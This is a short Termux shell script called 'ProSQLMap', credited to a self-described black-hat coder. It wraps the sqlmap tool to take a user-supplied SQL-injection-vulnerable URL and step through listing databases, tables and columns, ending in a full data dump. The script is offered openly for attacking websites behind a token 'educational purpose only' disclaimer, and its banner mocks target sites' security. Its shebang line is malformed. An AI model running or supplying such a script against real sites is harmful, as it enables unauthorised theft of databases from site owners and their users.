#!/data/data/com.termux/files/usr/bin/prosqlmap
# ProSQLMap
#
# This Tool Designed For Pro Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
# Coded by : Mr Finch99 | Black Hat Indonesia
# More Info : http://mr.finch99@aol.com
#
#

# START

# Header 
echo " _______  ______    _______  _______  _______  ___      __   __  _______  _______"
echo "|       ||    _ |  |       ||       ||       ||   |    |  |_|  ||   _   ||       |"
echo "|    _  ||   | ||  |   _   ||  _____||   _   ||   |    |       ||  |_|  ||    _  |"
echo "|   |_| ||   |_||_ |  | |  || |_____ |  | |  ||   |    |       ||       ||   |_| |"
echo "|    ___||    __  ||  |_|  ||_____  ||  |_|  ||   |___ |       ||       ||    ___|"
echo "|   |    |   |  | ||       | _____| ||      | |       || ||_|| ||   _   ||   |"  
echo "|___|    |___|  |_||_______||_______||____||_||_______||_|   |_||__| |__||___|"    
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo "    Let's Make Your Exploitation And Have Fun"
echo "" 
echo "    ==[ Tools Name : ProSqlMap"
echo "    ==[ ReCoded by : Finch99"
echo "    ==[ Version : 1.0.0"
echo "    ==[ Codename : What the fuck for your security website"

# Select Target

echo "" 
echo " Enter your SQL Injection Vulnerable Target Below" 
echo " Example : http://site.com/index.php?id=1"
echo " If You Want To Stop Just Press CTRL + C "
echo "" 
echo " Termux-ProSQLMap >>"
read TARGET
python2 sqlmap.py -u $TARGET --dbs

# Select Database

echo " Select Database For Table Injection" 
echo "" 
echo " GSH_ProSQLMap >>"
read DATABASE
python2 sqlmap.py -u $TARGET -D $DATABASE --table

# Select Table

echo " Select Table For Column Injection" 
echo "" 
echo " Termux-ProSQLMap >>"
read TABLE
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE --column

# Select Columns

echo " Select Column For Database Dump" 
echo "" 
echo " Termux-ProSQLMap >>"
read COLUMN
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN --dump

# END
